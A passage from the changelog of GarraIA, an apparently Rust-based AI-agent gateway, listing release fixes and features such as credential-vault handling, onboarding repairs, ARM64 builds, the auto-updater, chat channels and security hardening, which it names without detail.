  todos os PRs do dependabot. Migrados os 3 usos de `chunks_exact(4)` para
  `as_chunks::<4>()` (garraia-db ×2, garraia-embeddings ×1 — este último
  eliminando um `try_into().expect()`), mais `allow` pontual documentado de
  `result_large_err` no padrão axum de `issue_token_pair`.

### Changed
- Imagem base Docker atualizada para `rust:1.98-slim` (#849).
- `aws-smithy-runtime-api` 1.14.0 → 1.15.0 (#850).
- Documentação (README/ROADMAP/TODO) sincronizada com o cleanup de 2026-08-18 (#847).

## [0.3.2] - 2026-08-18

### Fixed
- **Binário Linux ARM64 de verdade desta vez** — dois defeitos empilhados:
  (1) o cross 0.2.5 de crates.io usa imagem base Ubuntu 16.04, cujo archive só
  tem OpenSSL 1.0.2 (abaixo do mínimo ≥ 1.1.0 do openssl-sys) — o release.yml
  agora instala o cross da git (imagens modernas); (2) o proc-macro do sqlx
  compilava openssl-sys para o HOST dentro do container e quebrava o
  cross-compile — resolvido movendo o sqlx para rustls (abaixo). Validado
  localmente: `cross build --target aarch64-unknown-linux-gnu` produz o ELF
  aarch64. v0.3.1 saiu com 4 binários (sem regressão vs v0.3.0); esta
  adiciona o quinto.

### Changed
- **sqlx: native-tls → rustls (`tls-rustls-ring-native-roots`)** — mantém as
  CAs do sistema para TLS com Postgres remoto. O sqlx-macros era o único
  consumidor de OpenSSL no lado host dos builds; reqwest/tungstenite seguem
  em native-tls (OpenSSL só no target, via `Cross.toml`). Suites de
  integração do garraia-auth verdes contra pgvector/pg16 real.

## [0.3.1] - 2026-08-18

### Fixed
- **`POST /v1/me/anonymize` funciona pela primeira vez** (plan 0354, PR #843) —
  o endpoint LGPD/GDPR retornava 500 em toda chamada: o código atualizava uma
  coluna `user_identities.login` que não existe neste schema. A anonimização
  agora cobre os três lugares onde o email vive — `user_identities.provider_sub`
  (chave de login), `users.email` e `group_invites.invited_email` — com token
  determinístico `anon-<uuid-32-hex>@garraanon.local` (UUID completo: o prefixo
  de 8 hex colidia sob UUIDv7). Revisado por security-auditor, sem blockers.
- **Release Linux ARM64 volta ao ar** (PR #842) — o build `cross` aarch64
  falhava por falta de OpenSSL do target e a v0.3.0 saiu sem o binário
  linux-aarch64. `Cross.toml` novo instala `libssl-dev:$CROSS_DEB_ARCH` no
  container de build; esta é a primeira release com os 5 binários.
- **h2 0.4.16** (PR #842) — RUSTSEC-2026-0258.
- **Vault-passphrase casing trap eliminated** (issue #824) — the two
  near-identical env vars `GARRAIA_VAULT_PASSPHRASE` (credential vault) and
  `GarraIA_VAULT_PASSPHRASE` (legacy JWT-secret fallback) no longer fail
  silently when the operator picks the "wrong" one. Every consumer now accepts
  both spellings: the credential vault (`garraia-security`) falls back to the
  mixed-case alias with a deprecation warning at boot, and
  `AuthConfig::from_env` accepts the all-caps spelling as its last JWT-secret
  fallback. Precedence is backwards-compatible — `GARRAIA_JWT_SECRET` >
  `GarraIA_VAULT_PASSPHRASE` > `GARRAIA_VAULT_PASSPHRASE` for auth, and
  all-caps > mixed-case for the vault — so deploys that set both spellings
  with different values keep their exact pre-fix behavior. `garraia config
  check` gains two warnings: a deprecation notice whenever the mixed-case
  spelling is set, and a split-values alert when both spellings are set with
  different values (presence/equality only — values are never emitted).

### Changed
- **Dependências consolidadas** (PR #844, cleanup 2026-08-18): serial_test
  4.0.1, base64 0.23, jsonwebtoken 11.0.0, validator 0.21, itertools 0.15,
  uuid 1.24.1, tauri 2.11.5 e **wasmtime + wasmtime-wasi 47.0.3** — o par
  agora também viaja junto no dependabot via grupo dedicado (PR #842).

### CI
- Jobs `e2e`/`playwright` ganham `timeout-minutes` (PR #842) — dois runs de 6h
  em 2026-08-17, travados no download do Chromium, motivaram o teto.
- Job novo `auth-integration` (PR #843): os 16 binários de integração do
  garraia-auth (matriz RLS incluída) agora rodam em todo PR — antes eram
  pulados silenciosamente pelo `cargo test --workspace` e só o cargo-mutants
  semanal os executava.

## [0.3.0] - 2026-08-16

### Onboarding: `install.sh` → `garraia init` → `garraia start` now actually works

The path the website documents was broken by construction on any fresh machine.
`garraia init` offered "Store in encrypted vault (**recommended**)" as the
default, encrypted the API key into `credentials/vault.json`, and left
`llm.<name>.api_key` as `null`. `install.sh` then ran `exec garraia start` in the
same shell, with no `GARRAIA_VAULT_PASSPHRASE` — so `try_vault_get` could not
open the vault, no key resolved, and the gateway came up with
`0 active / 1 configured` and `skipping openrouter provider main: no API key`.
The key was on disk, encrypted, and unreadable by the server that needed it.

#### Fixed
- **Wizard defaults to `config.yml`** (`wizard/mod.rs`) — the storage prompt now
  offers config first and defaults to it; the vault option's label states that
  it requires `GARRAIA_VAULT_PASSPHRASE` on *every* start instead of calling
  itself "recommended". When the vault is chosen, the passphrase reminder is
  printed as a block instead of a single line that scrolled away unseen. The
  Telegram bot token had the identical defect and got the identical fix.
- **`garraia init` can repair a broken config** (`wizard/config_writer.rs`) —
  `merge_update` was additive-only, so re-running the wizard over a config that
  already had a keyless `llm.main` *added* `llm.openrouter` and left `main`
  broken. A freshly-supplied OpenRouter key is now backfilled into pre-existing
  `openrouter` entries that have no key. A key the operator already set is never
  overwritten, and the local-Ollama placeholder is never leaked into a real
  `openai` entry.
- **`.env` was loaded after the providers were built** (`server.rs`,
  `bootstrap/channels.rs`) — the only `dotenvy::dotenv()` in the gateway ran
  inside `build_channels`, ~20 lines *after* `build_agent_runtime` had already
  read every provider's API-key env var. Anything embedding `Server` directly got
  working channels and dead providers. The load moved to the top of
  `Server::run`.
- **`POST /api/providers` silently discarded persistence failures**
  (`router.rs`) — the response was `201 {"status":"ok"}` even when
  `try_vault_set` no-opped for lack of a passphrase, so a provider added through
  the web console worked until the next restart and then vanished. The handler
  now reports `"persisted": bool`, says so in the message, and logs a WARN with
  the remedy.

#### Changed
- **`config.yml` is written with mode `0600`** (`garraia_config::harden_secret_file`)
  — it now carries `llm.*.api_key` by default, and `std::fs::write` alone left it
  at the umask default (commonly `0644`). Applied by `ConfigLoader::save` and by
  all three wizard write strategies.
- **One source of truth for API-key resolution**
  (`garraia_config::provider_keys`) — the question "does this provider have a
  usable key?" had three different answers: the boot path walked
  vault → config → env, `/health` checked config `||` env and ignored the vault,
  and the admin providers list reported `has_secret` from an AES-GCM SQLite store
  the boot path never reads. All three now share `resolve_api_key_source` and the
  `provider_key_env` table, which also replaced fifteen hardcoded
  `("X_API_KEY", "X_API_KEY")` pairs in `build_agent_runtime` and fourteen more in
  the provider-activation handler. `/api/providers` gained `key_source` and
  `has_admin_stored_secret` so the store's own state stays visible.
- **An empty provider env var now counts as absent.** `OPENROUTER_API_KEY=""`
  previously registered a provider with an empty credential that failed on the
  first call with an opaque upstream 401; it now reports the actionable "no API
  key" warning, consistent with the config tier which already ignored empty
  strings.
- **The "no API key" warning names all three remedies** — config, env var, *and*
  unlocking the vault. It previously omitted the vault, which is precisely where
  the wizard had put the key.
- **The startup banner stops overstating readiness** (`banner.rs`) — it printed
  the configured provider name unconditionally, directly above a log line saying
  that provider had been skipped. It now marks the state
  (`main ⚠ no API key`) and adds a `File` row naming the config file actually in
  force, since `ConfigLoader::load` prefers `config.yml` and silently ignores
  `config.toml` when both exist.
- Workspace `version = "0.3.0"` (`Cargo.toml`,
  `crates/garraia-desktop/src-tauri/Cargo.toml`, `tauri.conf.json`). The previous
  release left `main` at `0.2.1`, so a binary built from `main` announced itself
  as the released `v0.2.1` and the two were indistinguishable.

#### Added
- **`garraia config check` validates `llm:`** (`garraia-config/src/check.rs`) —
  it had no equivalent of the channel token warning, so the failure that took the
  whole gateway down was the one thing it would not report. It now emits an
  **Error** for any provider whose key resolves nowhere (consulting the vault, so
  it cannot disagree with the boot path), an Error for an unrecognized `provider`
  type, and a Warning when `llm:` is populated but `agent.default_provider` is
  unset — which silently disables provider auto-fallback.

#### Documentation
- `docs/installation.md` told operators to edit `~/.garraia/config.yml` while
  `ConfigLoader::default_config_dir` prefers `~/.config/garraia` whenever it
  exists, so readers were editing a file the gateway never read. It now documents
  the real resolution order, the `config.yml` over `config.toml` precedence, the
  vault passphrase requirement, and `GARRAIA_CONFIG_DIR` as the supported way to
  consolidate everything under one directory.
- `README.md` claimed `install.sh` verifies each binary against a per-asset
  `<asset>.sha256`; it verifies against the aggregate `SHA256SUMS` (the per-asset
  form is what `garraia update` uses). The `llm:` example now carries the vault
  passphrase caveat.

## [0.2.1] - 2026-05-14

### Auto-update pipeline — fixes 404 on `garraia update`

#### Fixed
- **`/releases/latest` 404** — Every prior tag (`v0.1.0-beta`, `v0.1.0-beta.1`, `v0.2.0-beta`) shipped as a prerelease, so the GitHub endpoint that `garraia update` calls (`GET /repos/{owner}/{repo}/releases/latest`) returned 404. `v0.2.1` is the first **non-prerelease** tag — the workflow auto-flips `prerelease: true` only when the tag contains `alpha`/`beta`/`rc`. From now on, installed `0.2.0` binaries find an updatable release.
- **Asset-name mismatch (`arm64` ↔ `aarch64`)** — `crates/garraia-cli/src/update.rs:43-50` selects assets by Rust's `std::env::consts::ARCH`, which on Apple Silicon and Linux ARMv8 is `aarch64`. The release workflow named those binaries `garraia-linux-arm64` / `garraia-macos-arm64`, so even if a non-prerelease existed the updater would have bailed with "release has no asset for this platform". Renamed to `garraia-linux-aarch64` / `garraia-macos-aarch64`.
- **Missing per-asset `.sha256` files** — `update.rs:127` reads `<asset>.sha256` siblings for tamper-detection. The previous workflow only emitted a single aggregate `SHA256SUMS`. The "Generate checksums" step now emits both: aggregate `SHA256SUMS` (kept for `install.sh` + human verification) **and** one `<asset>.sha256` per binary, gathered into the release via `release/*.sha256` glob.

#### Changed
- Workspace `version = "0.2.1"` (Cargo.toml, `crates/garraia-desktop/src-tauri/Cargo.toml`, `tauri.conf.json`).
- Prerelease gate widened to also detect `rc` in the tag string (was `alpha|beta`).

## [0.1.12] - 2026-02-27

### Fase 5: Delivery and Ecosystem

#### Added
- **README overhaul** - Updated architecture documentation with 14-crate workspace, runtime flow diagrams, voice pipeline (STT→LLM→TTS), multi-agent architecture, and MCP support
- **GitHub Actions release workflow** - Multi-platform binary builds for Linux (x86_64, ARM64), Windows (x86_64), macOS (x86_64, ARM64)
- **Website structure** - Initial documentation site with technical documentation, architecture overview, and integration guides

### Fase 4: Advanced Integrations

#### Added
- **Admin Console** - Full-featured web admin panel with user management, RBAC, audit logs, and billing
- **A2A Protocol** - Agent-to-agent communication with agent cards (`/.well-known/agent.json`) and task endpoints
- **Multi-agent routing** - Named agent registry with priority-based routing and session continuity
- **Media processing** - PDF extraction and image processing capabilities
- **Runtime state machine** - Executor with state management, meta-controller, and turn-based execution
- **Voice E2E pipeline** - Complete STT→LLM→TTS voice pipeline with Whisper, Chatterbox, and Hibiki support
- **Stateful commands** - Command registry with state management and persistent command state

#### Fixed
- Various stability improvements and bug fixes across all crates

### Fase 3: Runtime Integration & Voice E2E

#### Added
- **garraia-runtime crate** - State machine executor with IDLE→RUNNING→DONE transitions
- **Meta controller** - Execution budget management, max turns, retry with exponential backoff
- **Turn execution** - Complete message receive → tool execute → stream response flow
- **Voice pipeline E2E** - Full end-to-end voice processing from audio input to TTS output
- **Whisper STT** - Local and API-based speech-to-text
- **Chatterbox TTS** - GPU-accelerated multilingual text-to-speech
- **Hibiki TTS** - Additional GPU TTS option
- **Audio conversion** - FFmpeg-based audio format conversion

#### Changed
- Improved voice mode activation and health checks

### Fase 2: Stateful Commands

#### Added
- **Command registry** - Dynamic command registration with stateful support
- **Built-in commands** - /help, /clear, /model, /pair, /users, /voz, /health, /providers, /stats, /config, /mcp
- **Channel command integration** - Unified command system across Telegram, Discord, Slack, WhatsApp
- **Command aliases** - Multi-language aliases (e.g., /voz and /voice)
- **Command state** - Persistent command state across sessions

### Fase 1: Stabilization Fixes

#### Fixed
- Daemon mode stability and PID management
- Hot-reload configuration issues
- Memory leaks in long-running sessions
- WebSocket connection handling
- Health check timeouts

#### Changed
- Improved error handling and logging
- Optimized memory usage
- Better error messages for debugging

## [0.1.11] - 2026-02-23

### Fixed
- Fix daemon mode panic and wire live MCP panel in webchat

### Changed
- Update docs: add all 14 LLM providers, MCP page, and tools page

## [0.1.10] - 2026-02-22

### Added
- Add 8 OpenAI-compatible LLM providers (Gemini, Falcon, Jais, Qwen, Yi, Cohere, MiniMax, Moonshot)

### Fixed
- Fix Windows build: remove unix gate on anyhow::Context import

## [0.1.9] - 2026-02-21

### Added
- Add DeepSeek and Mistral providers

### Fixed
- Fix Ollama Docker port binding

## [0.1.8] - 2026-02-20

### Added
- Render markdown and tables in webchat responses
- Implement persistent 3-column webchat layout
- Add structural mockups for MCPs and Extensions views
- Enable hot-reloading for webchat.html during local dev

### Changed
- Add SECURITY.md, CODEOWNERS, and pin all GitHub Actions to commit SHAs

### Fixed
- Fix restart/stop when multiple PIDs on port
- Add Windows support for daemon management

## [0.1.7] - 2026-02-18

### Fixed
- Fix XSS in webchat and make update checksum mandatory

### Changed
- Add Discord invite link to README

## [0.1.6] - 2026-02-18

### Added
- Startup banner with Ferris logo and config summary
- Sandy theme and dark mode toggle for webchat
- Telegram group chat support, session mapping, and anonymous admin support
- Docker Compose deployment examples and .env.example
- mdBook documentation structure

### Fixed
- Fix restart/stop failing when no PID file exists
- Fix daemon stop logic on Windows to avoid unsafe PID termination
- Fix plugin path helper and Windows STILL_ACTIVE import

### Changed
- Improve native Windows compatibility and CLI path handling
- Refine webchat layout and sidebar hierarchy

## [0.1.5] - 2026-02-21

### Changed
- Feature-gate wasmtime/plugins behind opt-in `--features plugins` cargo feature
- Default release binary reduced from 22 MB to 16 MB (27% smaller)
- Removed unused `garraia-plugins` dependency from gateway crate

## [0.1.4] - 2026-02-21

### Added
- `garraia restart` command - gracefully stops daemon (if running) then starts a new one
- `try_stop_daemon()` helper that silently handles "no daemon running" case

### Changed
- Post-update message now suggests `garraia restart` instead of `garraia stop && garraia start`

## [0.1.3] - 2026-02-21

### Fixed
- Bumped workspace version to match release tags (was stuck at 0.1.0, causing false update notices)

## [0.1.2] - 2026-02-21

### Added
- `garraia update` command - downloads latest release from GitHub with SHA-256 checksum verification, atomic binary replacement, and backup
- `garraia rollback` command - restores the previous binary from `.old` backup
- Background version check with 24h cached TTL (`~/.garraia/update-check.json`)
- CLI update notice printed on every command when a newer version is available
- Webchat dismissible update banner when `/api/status` reports a newer version
- `version` and `latest_version` fields in `/api/status` response

## [0.1.1] - 2026-02-20

### Added
- Runtime LLM provider switching via webchat dropdown and REST API (`GET/POST /api/providers`)
- `AgentRuntime` interior mutability (`RwLock<Vec<Arc<dyn LlmProvider>>>`) for adding providers after startup
- `OpenAiProvider::with_name()` builder for OpenAI-compatible APIs with distinct provider IDs
- `try_vault_set()` for best-effort API key persistence at runtime
- WebSocket messages accept optional `provider` field for per-message provider routing
- Webchat sidebar with provider dropdown, API key input, and "Save & Activate" button

## [0.1.0] - 2026-02-20

### Added
- **A2A protocol** - Agent-to-agent communication with agent card (`/.well-known/agent.json`), task CRUD endpoints, and outbound `A2AClient` (#71)
- **Multi-agent routing** - Named agent configs, priority-based agent router, and REST session API (`POST /api/sessions`, `POST /api/sessions/:id/messages`, `GET /api/sessions/:id/history`) (#108)
- **MCP enhancements** - Resources, prompts, HTTP transport (`mcp-http` feature), auto-reconnect health monitor, `mcp resources` and `mcp prompts` CLI commands (#80)
- **Security hardening** - Shared log redaction crate, configurable HTTP rate limits, per-WebSocket sliding window throttle (30 msg/min) (#74)
- **Security documentation** - Architecture overview, vendor-neutral audit checklist, AI agent attack surfaces guide (#113)
- **Install script** - `curl -fsSL` one-liner with OS/arch detection, SHA-256 verification, smart install directory (#109)
- **Release matrix** - Linux aarch64 (via `cross`) and Windows x86_64 CI targets (#110)
- **Scheduling hardening** - Recursive self-scheduling guard, delay cap (30 days), per-session pending limit (5) (#107)
- **Built-in skills** - 6 starter skills: summarize, translate, code-review, explain, rewrite, brainstorm (#106)
- **README overhaul** - Competitive positioning, benchmark numbers, updated Quick Start (#103)
- **iMessage channel** - macOS-native iMessage adapter with group chats, attachments, reconnect backoff, deployment docs (#100, #101)
- **Sansa LLM provider** - Integration with Sansa AI (#98)
- **Security & sandbox fixes** - Path traversal prevention, SSRF blocking, WASM sandbox limits, test coverage (#97)
- **OpenClaw migration** - Migration tool for conversations and credentials from OpenClaw (TypeScript predecessor) (#103)
- **Discord channel** - Bot integration with streaming, slash command mapping, callback pipeline (#95)
- **Scheduling system** - Persistent task scheduling with heartbeat execution (#96)
- **WASM plugin sandbox** - Hot-reload registry, epoch deadlines, sandbox resource limits (#94)
- **Chat persistence** - Session hydration and history persistence across channels
- **WebSocket authentication** - API key auth for WebSocket handler with query param and header support
- **MCP client** - Model Context Protocol support with stdio transport, tool bridging, namespaced tools
- **Slack channel** - Socket Mode integration with markdown formatting
- **WhatsApp channel** - Webhook-based integration with verification endpoint
- **SKILL.md support** - Skill file parser, scanner, and installer
- **OpenAI streaming** - Streaming response support for OpenAI provider
- **Telegram channel** - Bot with allowlist, commands, typing indicator, streaming, markdown formatting, context window management
- **Ollama provider** - Local LLM support with tool calling
- **Agent orchestration** - Conversation loop with tool execution (max 10 iterations) and memory recall
- **Cohere embeddings** - Embedding provider for vector search in memory store
- **Memory store** - SQLite-backed memory with sqlite-vec for vector search, cross-channel continuity
- **Core providers** - Anthropic and OpenAI LLM providers with tool support
- **Core tools** - Bash, file read, file write, web fetch
- **Credential vault** - AES-256-GCM encrypted secret storage with PBKDF2-SHA256
- **CLI** - `garraia init` wizard, daemon mode, MCP/skill/channel/plugin commands
- **Gateway** - Axum-based WebSocket gateway with HTTP API, session management, config hot-reload
- **Security** - Allowlists, pairing codes, prompt injection detection (14 patterns), input validation
- **CI/CD** - GitHub Actions: check, test, clippy, fmt, cargo-deny, release pipeline

### Changed
- Repository moved to `garraia-org` organization
- Config loading follows XDG standards with backward compatibility
- `cargo-deny` migrated to v2 config format
- `garraia.dev` references updated to `garraia.org`

### Fixed
- Dangling symlink vulnerability in media processor
- Insecure file operation in `MediaProcessor`
- Clippy warnings and formatting across workspace

### Security
- Path traversal prevention in WASM plugin sandbox (post-canonicalize boundary check)
- SSRF blocking (private IP range rejection in plugins)
- Log redaction for API keys (Anthropic, OpenAI, Slack tokens)
- Rate limiting on HTTP and WebSocket endpoints
- Prompt injection detection with 14 pattern categories
